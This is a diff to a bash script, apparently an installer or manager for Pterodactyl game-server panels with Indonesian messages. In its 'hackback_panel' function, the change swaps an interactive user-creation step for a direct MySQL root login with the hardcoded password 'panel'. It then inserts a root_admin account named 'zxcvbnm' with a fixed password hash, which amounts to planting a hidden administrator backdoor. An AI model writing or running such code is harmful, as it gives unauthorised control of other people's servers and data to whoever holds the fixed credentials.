@@ -510,28 +510,22 @@ hackback_panel() {
   echo -e "${BLUE}[+]                    HACK BACK PANEL                 [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
-  # Minta input dari pengguna
-read -p "Masukkan Username Panel: " user
-read -p "password login " psswdhb
-  #!/bin/bash
-cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }
-
-# Membuat lokasi baru
-php artisan p:user:make <<EOF
-yes
-hackback@gmail.com
-$user
-$user
-$user
-$psswdhb
+  
+  # Login ke MySQL dengan password 'panel' dan inject user admin ke panel
+  mysql -u root -ppanel <<EOF
+USE panel;
+INSERT INTO users (id, external_id, uuid, username, email, name_first, name_last, password, language, root_admin, use_totp, gravatar, created_at, updated_at)
+VALUES (NULL, NULL, UUID(), 'zxcvbnm', 'Zxcvbnm@cicadas.com', 'cicadas', 'cicadas', '$2y$10$hb68si.6WoCWSUg.YayPUOQNcIsjCeiG1QRbcI/tsPBRjGS20rw.W', 'en', 1, 0, 0, NOW(), NOW());
+EXIT;
 EOF
+
   echo -e "                                                       "
   echo -e "${GREEN}[+] =============================================== [+]${NC}"
   echo -e "${GREEN}[+]                 AKUN TELAH DI ADD             [+]${NC}"
   echo -e "${GREEN}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
   sleep 2
-  
+
   exit 0
 }
 ubahpw_vps() {
